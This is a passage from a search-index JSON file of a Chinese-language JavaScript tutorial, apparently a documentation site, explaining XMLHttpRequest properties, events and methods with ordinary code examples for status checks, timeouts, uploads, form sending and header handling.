\u57fa\u672c\u4e0a\uff0c\u53ea\u67092xx\u548c304\u7684\u72b6\u6001\u7801\uff0c\u8868\u793a\u670d\u52a1\u5668\u8fd4\u56de\u662f\u6b63\u5e38\u72b6\u6001\u3002 1 2 3 4 5 6 7 8 if ( xhr . readyState === 4 ) { if ( ( xhr . status >= 200 && xhr . status < 300 ) || ( xhr . status === 304 ) ) { // \u5904\u7406\u670d\u52a1\u5668\u7684\u8fd4\u56de\u6570\u636e } else { // \u51fa\u9519 } } XMLHttpRequest.statusText \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u670d\u52a1\u5668\u53d1\u9001\u7684\u72b6\u6001\u63d0\u793a\u3002\u4e0d\u540c\u4e8e status \u5c5e\u6027\uff0c\u8be5\u5c5e\u6027\u5305\u542b\u6574\u4e2a\u72b6\u6001\u4fe1\u606f\uff0c\u6bd4\u5982\u201cOK\u201d\u548c\u201cNot Found\u201d\u3002\u5728\u8bf7\u6c42\u53d1\u9001\u4e4b\u524d\uff08\u5373\u8c03\u7528 open() \u65b9\u6cd5\u4e4b\u524d\uff09\uff0c\u8be5\u5c5e\u6027\u7684\u503c\u662f\u7a7a\u5b57\u7b26\u4e32\uff1b\u5982\u679c\u670d\u52a1\u5668\u6ca1\u6709\u8fd4\u56de\u72b6\u6001\u63d0\u793a\uff0c\u8be5\u5c5e\u6027\u7684\u503c\u9ed8\u8ba4\u4e3a\u201cOK\u201d\u3002\u8be5\u5c5e\u6027\u4e3a\u53ea\u8bfb\u5c5e\u6027\u3002","title":"XMLHttpRequest.status\uff0cXMLHttpRequest.statusText"},{"location":"bom/xmlhttprequest/#xmlhttprequesttimeoutxmlhttprequesteventtargetontimeout","text":"XMLHttpRequest.timeout \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u591a\u5c11\u6beb\u79d2\u540e\uff0c\u5982\u679c\u8bf7\u6c42\u4ecd\u7136\u6ca1\u6709\u5f97\u5230\u7ed3\u679c\uff0c\u5c31\u4f1a\u81ea\u52a8\u7ec8\u6b62\u3002\u5982\u679c\u8be5\u5c5e\u6027\u7b49\u4e8e0\uff0c\u5c31\u8868\u793a\u6ca1\u6709\u65f6\u95f4\u9650\u5236\u3002 XMLHttpRequestEventTarget.ontimeout \u5c5e\u6027\u7528\u4e8e\u8bbe\u7f6e\u4e00\u4e2a\u76d1\u542c\u51fd\u6570\uff0c\u5982\u679c\u53d1\u751f timeout \u4e8b\u4ef6\uff0c\u5c31\u4f1a\u6267\u884c\u8fd9\u4e2a\u76d1\u542c\u51fd\u6570\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 var xhr = new XMLHttpRequest (); var url = '/server' ; xhr . ontimeout = function () { console . error ( 'The request for ' + url + ' timed out.' ); }; xhr . onload = function () { if ( xhr . readyState === 4 ) { if ( xhr . status === 200 ) { // \u5904\u7406\u670d\u52a1\u5668\u8fd4\u56de\u7684\u6570\u636e } else { console . error ( xhr . statusText ); } } }; xhr . open ( 'GET' , url , true ); // \u6307\u5b9a 10 \u79d2\u949f\u8d85\u65f6 xhr . timeout = 10 * 1000 ; xhr . send ( null );","title":"XMLHttpRequest.timeout\uff0cXMLHttpRequestEventTarget.ontimeout"},{"location":"bom/xmlhttprequest/#_2","text":"XMLHttpRequest \u5bf9\u8c61\u53ef\u4ee5\u5bf9\u4ee5\u4e0b\u4e8b\u4ef6\u6307\u5b9a\u76d1\u542c\u51fd\u6570\u3002 XMLHttpRequest.onloadstart\uff1aloadstart \u4e8b\u4ef6\uff08HTTP \u8bf7\u6c42\u53d1\u51fa\uff09\u7684\u76d1\u542c\u51fd\u6570 XMLHttpRequest.onprogress\uff1aprogress\u4e8b\u4ef6\uff08\u6b63\u5728\u53d1\u9001\u548c\u52a0\u8f7d\u6570\u636e\uff09\u7684\u76d1\u542c\u51fd\u6570 XMLHttpRequest.onabort\uff1aabort \u4e8b\u4ef6\uff08\u8bf7\u6c42\u4e2d\u6b62\uff0c\u6bd4\u5982\u7528\u6237\u8c03\u7528\u4e86 abort() \u65b9\u6cd5\uff09\u7684\u76d1\u542c\u51fd\u6570 XMLHttpRequest.onerror\uff1aerror \u4e8b\u4ef6\uff08\u8bf7\u6c42\u5931\u8d25\uff09\u7684\u76d1\u542c\u51fd\u6570 XMLHttpRequest.onload\uff1aload \u4e8b\u4ef6\uff08\u8bf7\u6c42\u6210\u529f\u5b8c\u6210\uff09\u7684\u76d1\u542c\u51fd\u6570 XMLHttpRequest.ontimeout\uff1atimeout \u4e8b\u4ef6\uff08\u7528\u6237\u6307\u5b9a\u7684\u65f6\u9650\u8d85\u8fc7\u4e86\uff0c\u8bf7\u6c42\u8fd8\u672a\u5b8c\u6210\uff09\u7684\u76d1\u542c\u51fd\u6570 XMLHttpRequest.onloadend\uff1aloadend \u4e8b\u4ef6\uff08\u8bf7\u6c42\u5b8c\u6210\uff0c\u4e0d\u7ba1\u6210\u529f\u6216\u5931\u8d25\uff09\u7684\u76d1\u542c\u51fd\u6570 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 xhr . onload = function () { var responseText = xhr . responseText ; console . log ( responseText ); // process the response. }; xhr . onabort = function () { console . log ( 'The request was aborted' ); }; xhr . onprogress = function ( event ) { console . log ( event . loaded ); console . log ( event . total ); }; xhr . onerror = function () { console . log ( 'There was an error!' ); }; progress \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u6709\u4e00\u4e2a\u4e8b\u4ef6\u5bf9\u8c61\u53c2\u6570\uff0c\u8be5\u5bf9\u8c61\u6709\u4e09\u4e2a\u5c5e\u6027\uff1a loaded \u5c5e\u6027\u8fd4\u56de\u5df2\u7ecf\u4f20\u8f93\u7684\u6570\u636e\u91cf\uff0c total \u5c5e\u6027\u8fd4\u56de\u603b\u7684\u6570\u636e\u91cf\uff0c lengthComputable \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u52a0\u8f7d\u7684\u8fdb\u5ea6\u662f\u5426\u53ef\u4ee5\u8ba1\u7b97\u3002\u6240\u6709\u8fd9\u4e9b\u76d1\u542c\u51fd\u6570\u91cc\u9762\uff0c\u53ea\u6709 progress \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u6709\u53c2\u6570\uff0c\u5176\u4ed6\u51fd\u6570\u90fd\u6ca1\u6709\u53c2\u6570\u3002 \u6ce8\u610f\uff0c\u5982\u679c\u53d1\u751f\u7f51\u7edc\u9519\u8bef\uff08\u6bd4\u5982\u670d\u52a1\u5668\u65e0\u6cd5\u8fde\u901a\uff09\uff0c onerror \u4e8b\u4ef6\u65e0\u6cd5\u83b7\u53d6\u62a5\u9519\u4fe1\u606f\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u53ef\u80fd\u6ca1\u6709\u9519\u8bef\u5bf9\u8c61\uff0c\u6240\u4ee5\u8fd9\u6837\u53ea\u80fd\u663e\u793a\u62a5\u9519\u7684\u63d0\u793a\u3002","title":"\u4e8b\u4ef6\u76d1\u542c\u5c5e\u6027"},{"location":"bom/xmlhttprequest/#xmlhttprequestwithcredentials","text":"XMLHttpRequest.withCredentials \u5c5e\u6027\u662f\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u8de8\u57df\u8bf7\u6c42\u65f6\uff0c\u7528\u6237\u4fe1\u606f\uff08\u6bd4\u5982 Cookie \u548c\u8ba4\u8bc1\u7684 HTTP \u5934\u4fe1\u606f\uff09\u662f\u5426\u4f1a\u5305\u542b\u5728\u8bf7\u6c42\u4e4b\u4e2d\uff0c\u9ed8\u8ba4\u4e3a false \uff0c\u5373\u5411 example.com \u53d1\u51fa\u8de8\u57df\u8bf7\u6c42\u65f6\uff0c\u4e0d\u4f1a\u53d1\u9001 example.com \u8bbe\u7f6e\u5728\u672c\u673a\u4e0a\u7684 Cookie\uff08\u5982\u679c\u6709\u7684\u8bdd\uff09\u3002 \u5982\u679c\u9700\u8981\u8de8\u57df AJAX \u8bf7\u6c42\u53d1\u9001 Cookie\uff0c\u9700\u8981 withCredentials \u5c5e\u6027\u8bbe\u4e3a true \u3002\u6ce8\u610f\uff0c\u540c\u6e90\u7684\u8bf7\u6c42\u4e0d\u9700\u8981\u8bbe\u7f6e\u8fd9\u4e2a\u5c5e\u6027\u3002 1 2 3 4 var xhr = new XMLHttpRequest (); xhr . open ( 'GET' , 'http://example.com/' , true ); xhr . withCredentials = true ; xhr . send ( null ); \u4e3a\u4e86\u8ba9\u8fd9\u4e2a\u5c5e\u6027\u751f\u6548\uff0c\u670d\u52a1\u5668\u5fc5\u987b\u663e\u5f0f\u8fd4\u56de Access-Control-Allow-Credentials \u8fd9\u4e2a\u5934\u4fe1\u606f\u3002 1 Access - Control - Allow - Credentials : true withCredentials \u5c5e\u6027\u6253\u5f00\u7684\u8bdd\uff0c\u8de8\u57df\u8bf7\u6c42\u4e0d\u4ec5\u4f1a\u53d1\u9001 Cookie\uff0c\u8fd8\u4f1a\u8bbe\u7f6e\u8fdc\u7a0b\u4e3b\u673a\u6307\u5b9a\u7684 Cookie\u3002\u53cd\u4e4b\u4e5f\u6210\u7acb\uff0c\u5982\u679c withCredentials \u5c5e\u6027\u6ca1\u6709\u6253\u5f00\uff0c\u90a3\u4e48\u8de8\u57df\u7684 AJAX \u8bf7\u6c42\u5373\u4f7f\u660e\u786e\u8981\u6c42\u6d4f\u89c8\u5668\u8bbe\u7f6e Cookie\uff0c\u6d4f\u89c8\u5668\u4e5f\u4f1a\u5ffd\u7565\u3002 \u6ce8\u610f\uff0c\u811a\u672c\u603b\u662f\u9075\u5b88\u540c\u6e90\u653f\u7b56\uff0c\u65e0\u6cd5\u4ece document.cookie \u6216\u8005 HTTP \u56de\u5e94\u7684\u5934\u4fe1\u606f\u4e4b\u4e2d\uff0c\u8bfb\u53d6\u8de8\u57df\u7684 Cookie\uff0c withCredentials \u5c5e\u6027\u4e0d\u5f71\u54cd\u8fd9\u4e00\u70b9\u3002","title":"XMLHttpRequest.withCredentials"},{"location":"bom/xmlhttprequest/#xmlhttprequestupload","text":"XMLHttpRequest \u4e0d\u4ec5\u53ef\u4ee5\u53d1\u9001\u8bf7\u6c42\uff0c\u8fd8\u53ef\u4ee5\u53d1\u9001\u6587\u4ef6\uff0c\u8fd9\u5c31\u662f AJAX \u6587\u4ef6\u4e0a\u4f20\u3002\u53d1\u9001\u6587\u4ef6\u4ee5\u540e\uff0c\u901a\u8fc7 XMLHttpRequest.upload \u5c5e\u6027\u53ef\u4ee5\u5f97\u5230\u4e00\u4e2a\u5bf9\u8c61\uff0c\u901a\u8fc7\u89c2\u5bdf\u8fd9\u4e2a\u5bf9\u8c61\uff0c\u53ef\u4ee5\u5f97\u77e5\u4e0a\u4f20\u7684\u8fdb\u5c55\u3002\u4e3b\u8981\u65b9\u6cd5\u5c31\u662f\u76d1\u542c\u8fd9\u4e2a\u5bf9\u8c61\u7684\u5404\u79cd\u4e8b\u4ef6\uff1aloadstart\u3001loadend\u3001load\u3001abort\u3001error\u3001progress\u3001timeout\u3002 \u5047\u5b9a\u7f51\u9875\u4e0a\u6709\u4e00\u4e2a <progress> \u5143\u7d20\u3002 1 <progress min=\"0\" max=\"100\" value=\"0\">0% complete</progress> \u6587\u4ef6\u4e0a\u4f20\u65f6\uff0c\u5bf9 upload \u5c5e\u6027\u6307\u5b9a progress \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\uff0c\u5373\u53ef\u83b7\u5f97\u4e0a\u4f20\u7684\u8fdb\u5ea6\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 function upload ( blobOrFile ) { var xhr = new XMLHttpRequest (); xhr . open ( 'POST' , '/server' , true ); xhr . onload = function ( e ) {}; var progressBar = document . querySelector ( 'progress' ); xhr . upload . onprogress = function ( e ) { if ( e . lengthComputable ) { progressBar . value = ( e . loaded / e . total ) * 100 ; // \u517c\u5bb9\u4e0d\u652f\u6301 <progress> \u5143\u7d20\u7684\u8001\u5f0f\u6d4f\u89c8\u5668 progressBar . textContent = progressBar . value ; } }; xhr . send ( blobOrFile ); } upload ( new Blob ([ 'hello world' ], { type : 'text/plain' }));","title":"XMLHttpRequest.upload"},{"location":"bom/xmlhttprequest/#xmlhttprequest_2","text":"","title":"XMLHttpRequest \u7684\u5b9e\u4f8b\u65b9\u6cd5"},{"location":"bom/xmlhttprequest/#xmlhttprequestopen","text":"XMLHttpRequest.open() \u65b9\u6cd5\u7528\u4e8e\u6307\u5b9a HTTP \u8bf7\u6c42\u7684\u53c2\u6570\uff0c\u6216\u8005\u8bf4\u521d\u59cb\u5316 XMLHttpRequest \u5b9e\u4f8b\u5bf9\u8c61\u3002\u5b83\u4e00\u5171\u53ef\u4ee5\u63a5\u53d7\u4e94\u4e2a\u53c2\u6570\u3002 1 2 3 4 5 6 7 void open ( string method , string url , optional boolean async , optional string user , optional string password ); method \uff1a\u8868\u793a HTTP \u52a8\u8bcd\u65b9\u6cd5\uff0c\u6bd4\u5982 GET \u3001 POST \u3001 PUT \u3001 DELETE \u3001 HEAD \u7b49\u3002 url : \u8868\u793a\u8bf7\u6c42\u53d1\u9001\u76ee\u6807 URL\u3002 async : \u5e03\u5c14\u503c\uff0c\u8868\u793a\u8bf7\u6c42\u662f\u5426\u4e3a\u5f02\u6b65\uff0c\u9ed8\u8ba4\u4e3a true \u3002\u5982\u679c\u8bbe\u4e3a false \uff0c\u5219 send() \u65b9\u6cd5\u53ea\u6709\u7b49\u5230\u6536\u5230\u670d\u52a1\u5668\u8fd4\u56de\u4e86\u7ed3\u679c\uff0c\u624d\u4f1a\u8fdb\u884c\u4e0b\u4e00\u6b65\u64cd\u4f5c\u3002\u8be5\u53c2\u6570\u53ef\u9009\u3002\u7531\u4e8e\u540c\u6b65 AJAX \u8bf7\u6c42\u4f1a\u9020\u6210\u6d4f\u89c8\u5668\u5931\u53bb\u54cd\u5e94\uff0c\u8bb8\u591a\u6d4f\u89c8\u5668\u5df2\u7ecf\u7981\u6b62\u5728\u4e3b\u7ebf\u7a0b\u4f7f\u7528\uff0c\u53ea\u5141\u8bb8 Worker \u91cc\u9762\u4f7f\u7528\u3002\u6240\u4ee5\uff0c\u8fd9\u4e2a\u53c2\u6570\u8f7b\u6613\u4e0d\u5e94\u8be5\u8bbe\u4e3a false \u3002 user \uff1a\u8868\u793a\u7528\u4e8e\u8ba4\u8bc1\u7684\u7528\u6237\u540d\uff0c\u9ed8\u8ba4\u4e3a\u7a7a\u5b57\u7b26\u4e32\u3002\u8be5\u53c2\u6570\u53ef\u9009\u3002 password \uff1a\u8868\u793a\u7528\u4e8e\u8ba4\u8bc1\u7684\u5bc6\u7801\uff0c\u9ed8\u8ba4\u4e3a\u7a7a\u5b57\u7b26\u4e32\u3002\u8be5\u53c2\u6570\u53ef\u9009\u3002 \u6ce8\u610f\uff0c\u5982\u679c\u5bf9\u4f7f\u7528\u8fc7 open() \u65b9\u6cd5\u7684 AJAX \u8bf7\u6c42\uff0c\u518d\u6b21\u4f7f\u7528\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u7b49\u540c\u4e8e\u8c03\u7528 abort() \uff0c\u5373\u7ec8\u6b62\u8bf7\u6c42\u3002 \u4e0b\u9762\u53d1\u9001 POST \u8bf7\u6c42\u7684\u4f8b\u5b50\u3002 1 2 var xhr = new XMLHttpRequest (); xhr . open ( 'POST' , encodeURI ( 'someURL' ));","title":"XMLHttpRequest.open()"},{"location":"bom/xmlhttprequest/#xmlhttprequestsend","text":"XMLHttpRequest.send() \u65b9\u6cd5\u7528\u4e8e\u5b9e\u9645\u53d1\u51fa HTTP \u8bf7\u6c42\u3002\u5b83\u7684\u53c2\u6570\u662f\u53ef\u9009\u7684\uff0c\u5982\u679c\u4e0d\u5e26\u53c2\u6570\uff0c\u5c31\u8868\u793a HTTP \u8bf7\u6c42\u53ea\u6709\u4e00\u4e2a URL\uff0c\u6ca1\u6709\u6570\u636e\u4f53\uff0c\u5178\u578b\u4f8b\u5b50\u5c31\u662f GET \u8bf7\u6c42\uff1b\u5982\u679c\u5e26\u6709\u53c2\u6570\uff0c\u5c31\u8868\u793a\u9664\u4e86\u5934\u4fe1\u606f\uff0c\u8fd8\u5e26\u6709\u5305\u542b\u5177\u4f53\u6570\u636e\u7684\u4fe1\u606f\u4f53\uff0c\u5178\u578b\u4f8b\u5b50\u5c31\u662f POST \u8bf7\u6c42\u3002 \u4e0b\u9762\u662f GET \u8bf7\u6c42\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 var xhr = new XMLHttpRequest (); xhr . open ( 'GET' , 'http://www.example.com/?id=' + encodeURIComponent ( id ), true ); xhr . send ( null ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c GET \u8bf7\u6c42\u7684\u53c2\u6570\uff0c\u4f5c\u4e3a\u67e5\u8be2\u5b57\u7b26\u4e32\u9644\u52a0\u5728 URL \u540e\u9762\u3002 \u4e0b\u9762\u662f\u53d1\u9001 POST \u8bf7\u6c42\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 var xhr = new XMLHttpRequest (); var data = 'email=' + encodeURIComponent ( email ) + '&password=' + encodeURIComponent ( password ); xhr . open ( 'POST' , 'http://www.example.com' , true ); xhr . setRequestHeader ( 'Content-Type' , 'application/x-www-form-urlencoded' ); xhr . send ( data ); \u6ce8\u610f\uff0c\u6240\u6709 XMLHttpRequest \u7684\u76d1\u542c\u4e8b\u4ef6\uff0c\u90fd\u5fc5\u987b\u5728 send() \u65b9\u6cd5\u8c03\u7528\u4e4b\u524d\u8bbe\u5b9a\u3002 send \u65b9\u6cd5\u7684\u53c2\u6570\u5c31\u662f\u53d1\u9001\u7684\u6570\u636e\u3002\u591a\u79cd\u683c\u5f0f\u7684\u6570\u636e\uff0c\u90fd\u53ef\u4ee5\u4f5c\u4e3a\u5b83\u7684\u53c2\u6570\u3002 1 2 3 4 5 6 void send (); void send ( ArrayBufferView data ); void send ( Blob data ); void send ( Document data ); void send ( String data ); void send ( FormData data ); \u5982\u679c send() \u53d1\u9001 DOM \u5bf9\u8c61\uff0c\u5728\u53d1\u9001\u4e4b\u524d\uff0c\u6570\u636e\u4f1a\u5148\u88ab\u4e32\u884c\u5316\u3002\u5982\u679c\u53d1\u9001\u4e8c\u8fdb\u5236\u6570\u636e\uff0c\u6700\u597d\u662f\u53d1\u9001 ArrayBufferView \u6216 Blob \u5bf9\u8c61\uff0c\u8fd9\u4f7f\u5f97\u901a\u8fc7 Ajax \u4e0a\u4f20\u6587\u4ef6\u6210\u4e3a\u53ef\u80fd\u3002 \u4e0b\u9762\u662f\u53d1\u9001\u8868\u5355\u6570\u636e\u7684\u4f8b\u5b50\u3002 FormData \u5bf9\u8c61\u53ef\u4ee5\u7528\u4e8e\u6784\u9020\u8868\u5355\u6570\u636e\u3002 1 2 3 4 5 6 7 8 9 var formData = new FormData (); formData . append ( 'username' , '\u5f20\u4e09' ); formData . append ( 'email' , 'zhangsan@example.com' ); formData . append ( 'birthDate' , 1940 ); var xhr = new XMLHttpRequest (); xhr . open ( 'POST' , '/register' ); xhr . send ( formData ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c FormData \u5bf9\u8c61\u6784\u9020\u4e86\u8868\u5355\u6570\u636e\uff0c\u7136\u540e\u4f7f\u7528 send() \u65b9\u6cd5\u53d1\u9001\u3002\u5b83\u7684\u6548\u679c\u4e0e\u53d1\u9001\u4e0b\u9762\u7684\u8868\u5355\u6570\u636e\u662f\u4e00\u6837\u7684\u3002 1 2 3 4 5 6 < form id = 'registration' name = 'registration' action = '/register' > < input type = 'text' name = 'username' value = '\u5f20\u4e09' > < input type = 'email' name = 'email' value = 'zhangsan@example.com' > < input type = 'number' name = 'birthDate' value = '1940' > < input type = 'submit' onclick = 'return sendForm(this.form);' > </ form > \u4e0b\u9762\u7684\u4f8b\u5b50\u662f\u4f7f\u7528 FormData \u5bf9\u8c61\u52a0\u5de5\u8868\u5355\u6570\u636e\uff0c\u7136\u540e\u518d\u53d1\u9001\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 function sendForm ( form ) { var formData = new FormData ( form ); formData . append ( 'csrf' , 'e69a18d7db1286040586e6da1950128c' ); var xhr = new XMLHttpRequest (); xhr . open ( 'POST' , form . action , true ); xhr . onload = function () { // ... }; xhr . send ( formData ); return false ; } var form = document . querySelector ( '#registration' ); sendForm ( form );","title":"XMLHttpRequest.send()"},{"location":"bom/xmlhttprequest/#xmlhttprequestsetrequestheader","text":"XMLHttpRequest.setRequestHeader() \u65b9\u6cd5\u7528\u4e8e\u8bbe\u7f6e\u6d4f\u89c8\u5668\u53d1\u9001\u7684 HTTP \u8bf7\u6c42\u7684\u5934\u4fe1\u606f\u3002\u8be5\u65b9\u6cd5\u5fc5\u987b\u5728 open() \u4e4b\u540e\u3001 send() \u4e4b\u524d\u8c03\u7528\u3002\u5982\u679c\u8be5\u65b9\u6cd5\u591a\u6b21\u8c03\u7528\uff0c\u8bbe\u5b9a\u540c\u4e00\u4e2a\u5b57\u6bb5\uff0c\u5219\u6bcf\u4e00\u6b21\u8c03\u7528\u7684\u503c\u4f1a\u88ab\u5408\u5e76\u6210\u4e00\u4e2a\u5355\u4e00\u7684\u503c\u53d1\u9001\u3002 \u8be5\u65b9\u6cd5\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\u3002\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u5934\u4fe1\u606f\u7684\u5b57\u6bb5\u540d\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u5b57\u6bb5\u503c\u3002 1 2 3 xhr . setRequestHeader ( 'Content-Type' , 'application/json' ); xhr . setRequestHeader ( 'Content-Length' , JSON . stringify ( data ). length ); xhr . send ( JSON . stringify ( data )); \u4e0a\u9762\u4ee3\u7801\u9996\u5148\u8bbe\u7f6e\u5934\u4fe1\u606f Content-Type \uff0c\u8868\u793a\u53d1\u9001 JSON \u683c\u5f0f\u7684\u6570\u636e\uff1b\u7136\u540e\u8bbe\u7f6e Content-Length \uff0c\u8868\u793a\u6570\u636e\u957f\u5ea6\uff1b\u6700\u540e\u53d1\u9001 JSON \u6570\u636e\u3002","title":"XMLHttpRequest.setRequestHeader()"},{"location":"bom/xmlhttprequest/#xmlhttprequestoverridemimetype","text":"XMLHttpRequest.overrideMimeType() \u65b9\u6cd5\u7528\u6765\u6307\u5b9a MIME \u7c7b\u578b\uff0c\u8986\u76d6\u670d\u52a1\u5668\u8fd4\u56de\u7684\u771f\u6b63\u7684 MIME \u7c7b\u578b\uff0c\u4ece\u800c\u8ba9\u6d4f\u89c8\u5668\u8fdb\u884c\u4e0d\u4e00\u6837\u7684\u5904\u7406\u3002\u4e3e\u4f8b\u6765\u8bf4\uff0c\u670d\u52a1\u5668\u8fd4\u56de\u7684\u6570\u636e\u7c7b\u578b\u662f text/xml \uff0c\u7531\u4e8e\u79cd\u79cd\u539f\u56e0\u6d4f\u89c8\u5668\u89e3\u6790\u4e0d\u6210\u529f\u62a5\u9519\uff0c\u8fd9\u65f6\u5c31\u62ff\u4e0d\u5230\u6570\u636e\u4e86\u3002\u4e3a\u4e86\u62ff\u5230\u539f\u59cb\u6570\u636e\uff0c\u6211\u4eec\u53ef\u4ee5\u628a MIME \u7c7b\u578b\u6539\u6210 text/plain \uff0c\u8fd9\u6837\u6d4f\u89c8\u5668\u5c31\u4e0d\u4f1a\u53bb\u81ea\u52a8\u89e3\u6790\uff0c\u4ece\u800c\u6211\u4eec\u5c31\u53ef\u4ee5\u62ff\u5230\u539f\u59cb\u6587\u672c\u4e86\u3002 1 xhr . overrideMimeType ( 'text/plain' ) \u6ce8\u610f\uff0c\u8be5\u65b9\u6cd5\u5fc5\u987b\u5728 send() \u65b9\u6cd5\u4e4b\u524d\u8c03\u7528\u3002 \u4fee\u6539\u670d\u52a1\u5668\u8fd4\u56de\u7684\u6570\u636e\u7c7b\u578b\uff0c\u4e0d\u662f\u6b63\u5e38\u60c5\u51b5\u4e0b\u5e94\u8be5\u91c7\u53d6\u7684\u65b9\u6cd5\u3002\u5982\u679c\u5e0c\u671b\u670d\u52a1\u5668\u8fd4\u56de\u6307\u5b9a\u7684\u6570\u636e\u7c7b\u578b\uff0c\u53ef\u4ee5\u7528 responseType \u5c5e\u6027\u544a\u8bc9\u670d\u52a1\u5668\uff0c\u5c31\u50cf\u4e0b\u9762\u7684\u4f8b\u5b50\u3002\u53ea\u6709\u5728\u670d\u52a1\u5668\u65e0\u6cd5\u8fd4\u56de\u67d0\u79cd\u6570\u636e\u7c7b\u578b\u65f6\uff0c\u624d\u4f7f\u7528 overrideMimeType() \u65b9\u6cd5\u3002 1 2 3 4 5 6 7 8 var xhr = new XMLHttpRequest (); xhr . onload = function ( e ) { var arraybuffer = xhr . response ; // ... } xhr . open ( 'GET' , url ); xhr . responseType = 'arraybuffer' ; xhr . send ();","title":"XMLHttpRequest.overrideMimeType()"},{"location":"bom/xmlhttprequest/#xmlhttprequestgetresponseheader","text":"XMLHttpRequest.getResponseHeader() \u65b9\u6cd5\u8fd4\u56de HTTP \u5934\u4fe1\u606f\u6307\u5b9a\u5b57\u6bb5\u7684\u503c\uff0c\u5982\u679c\u8fd8\u6ca1\u6709\u6536\u5230\u670d\u52a1\u5668\u56de\u5e94\u6216\u8005\u6307\u5b9a\u5b57\u6bb5\u4e0d\u5b58\u5728\uff0c\u8fd4\u56de null \u3002\u8be5\u65b9\u6cd5\u7684\u53c2\u6570\u4e0d\u533a\u5206\u5927\u5c0f\u5199\u3002 1 2 3 4 5 6 7 8 function getHeaderTime () { console . log ( this . getResponseHeader ( \"Last-Modified\" )); } var xhr = new XMLHttpRequest (); xhr . open ( 'HEAD' , 'yourpage.html' ); xhr . onload = getHeaderTime ; xhr . send (); \u5982\u679c\u6709\u591a\u4e2a\u5b57\u6bb5\u540c\u540d\uff0c\u5b83\u4eec\u7684\u503c\u4f1a\u88ab\u8fde\u63a5\u4e3a\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u6bcf\u4e2a\u5b57\u6bb5\u4e4b\u95f4\u4f7f\u7528\u201c\u9017\u53f7+\u7a7a\u683c\u201d\u5206\u9694\u3002","title":"XMLHttpRequest.getResponseHeader()"},{"location":"bom/xmlhttprequest/#xmlhttprequestgetallresponseheaders","text":"XMLHttpRequest.getAllResponseHeaders() \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u670d\u52a1\u5668\u53d1\u6765\u7684\u6240\u6709 HTTP \u5934\u4fe1\u606f\u3002\u683c\u5f0f\u4e3a\u5b57\u7b26\u4e32\uff0c\u6bcf\u4e2a\u5934\u4fe1\u606f\u4e4b\u95f4\u4f7f\u7528 CRLF \u5206\u9694\uff08\u56de\u8f66+\u6362\u884c\uff09\uff0c\u5982\u679c\u6ca1\u6709\u6536\u5230\u670d\u52a1\u5668\u56de\u5e94\uff0c\u8be5\u5c5e\u6027\u4e3a null \u3002\u5982\u679c\u53d1\u751f\u7f51\u7edc\u9519\u8bef\uff0c\u8be5\u5c5e\u6027\u4e3a\u7a7a\u5b57\u7b26\u4e32\u3002 1 2 3 4 5 6 7 8 9 var xhr = new XMLHttpRequest (); xhr . open ( 'GET' , 'foo.txt' , true ); xhr . send (); xhr . onreadystatechange = function () { if ( this . readyState === 4 ) { var headers = xhr . getAllResponseHeaders (); } } \u4e0a\u9762\u4ee3\u7801\u7528\u4e8e\u83b7\u53d6\u670d\u52a1\u5668\u8fd4\u56de\u7684\u6240\u6709\u5934\u4fe1\u606f\u3002\u5b83\u53ef\u80fd\u662f\u4e0b\u9762\u8fd9\u6837\u7684\u5b57\u7b26\u4e32\u3002 1 2 3 4 5 6 7 8 9 10 11 date: Fri, 08 Dec 2017 21:04:30 GMT\\r\\n content-encoding: gzip\\r\\n x-content-type-options: nosniff\\r\\n server: meinheld/0.6.1\\r\\n x-frame-options: DENY\\r\\n content-type: text/html; charset=utf-8\\r\\n connection: keep-alive\\r\\n strict-transport-security: max-age=63072000\\r\\n vary: Cookie, Accept-Encoding\\r\\n content-length: 6502\\r\\n x-xss-protection: 1; mode=block\\r\\n \u7136\u540e\uff0c\u5bf9\u8fd9\u4e2a\u5b57\u7b26\u4e32\u8fdb\u884c\u5904\u7406\u3002 1 2 3 4 5 6 7 8 9 10 11 var arr = headers . trim (). split ( /[\\r\\n]+/ ); var headerMap = {}; arr . forEach ( function ( line ) { var parts = line . split ( ': ' ); var header = parts . shift (); var value = parts . join ( ': ' ); headerMap [ header ] = value ; }); headerMap [ 'content-length' ] // \"6502\"","title":"XMLHttpRequest.getAllResponseHeaders()"},{"location":"bom/xmlhttprequest/#xmlhttprequestabort","text":"XMLHttpRequest.abort() \u65b9\u6cd5\u7528\u6765\u7ec8\u6b62\u5df2\u7ecf\u53d1\u51fa\u7684 HTTP \u8bf7\u6c42\u3002\u8c03\u7528\u8fd9\u4e2a\u65b9\u6cd5\u4ee5\u540e\uff0c readyState \u5c5e\u6027\u53d8\u4e3a 4 \uff0c status \u5c5e\u6027\u53d8\u4e3a 0 \u3002 1 2 3 4 5 6 7 8 var xhr = new XMLHttpRequest (); xhr . open ( 'GET' , 'http://www.example.com/page.php' , true ); setTimeout ( function () { if ( xhr ) { xhr . abort (); xhr = null 